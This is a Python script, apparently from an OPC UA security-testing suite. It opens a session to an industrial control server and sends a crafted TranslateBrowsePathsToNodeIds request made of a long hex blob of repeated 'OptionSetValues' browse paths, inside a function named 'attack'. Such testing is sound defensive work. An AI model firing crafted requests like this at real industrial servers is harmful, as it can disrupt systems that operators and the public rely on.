# Translate Browse Path to Node ID from OPC UA Server
# This code constructs and sends a message to translate the browse path to a Node ID
# following specified rules, with comments for explanation.

import datetime
from protocol import *
from config import *

def attack(server_details):
    """
    서버 세부 정보와 연결한 후 Browse Path를 Node ID로 변환하는 요청을 수행하는 함수입니다.
    """

    # OPC UA 서버 연결 설정
    program_type, ip_addr, port, query_string = server_details

    # OPCUA 인스턴스 생성 및 세션 시작
    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # 메시지 헤더 빌드
    message_header = opcua.build_opcua_message_header()

    # 메시지 바디 구성 (TranslateBrowsePathsToNodeIds 요청)
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=554)

    # Array of browse path
    array_of_browse_path = bytes.fromhex("150000000100b73a01000000002e000100000f0000004f7074696f6e53657456616c7565730100b93a01000000002e000100000f0000004f7074696f6e53657456616c7565730103ac2601000000002e000100000f0000004f7074696f6e53657456616c756573005f01000000002e000100000f0000004f7074696f6e53657456616c7565730100203e01000000002e000100000f0000004f7074696f6e53657456616c7565730103ae2601000000002e000100000f0000004f7074696f6e53657456616c756573005e01000000002e000100000f0000004f7074696f6e53657456616c7565730100200101000000002e000100000f0000004f7074696f6e53657456616c7565730100210101000000002e000100000f0000004f7074696f6e53657456616c75657301005b0101000000002e000100000f0000004f7074696f6e53657456616c75657301002e3c01000000002e000100000f0000004f7074696f6e53657456616c7565730100df3c01000000002e000100000f0000004f7074696f6e53657456616c75657301001a3d01000000002e000100000f0000004f7074696f6e53657456616c75657301001e3d01000000002e000100000f0000004f7074696f6e53657456616c7565730100263d01000000002e000100000f0000004f7074696f6e53657456616c75657301002a3d01000000002e000100000f0000004f7074696f6e53657456616c7565730100b44401000000002e000100000f0000004f7074696f6e53657456616c7565730100065201000000002e000100000f0000004f7074696f6e53657456616c7565730103b02601000000002e000100000f0000004f7074696f6e53657456616c7565730100d92d01000000002e000100000f0000004f7074696f6e53657456616c7565730103b22601000000002e000100000f0000004f7074696f6e53657456616c756573")
    message = message_header + message_body + array_of_browse_path

    # 요청 전송
    print(f"[-] Sending MSG Request - Translate Browse Path to Node ID x {1} times")
    opcua.send_recv(message, count=1, should_recv=True)

    time.sleep(0.2)

    # Close connection
    print("[-] Closing connection")
    opcua.close()
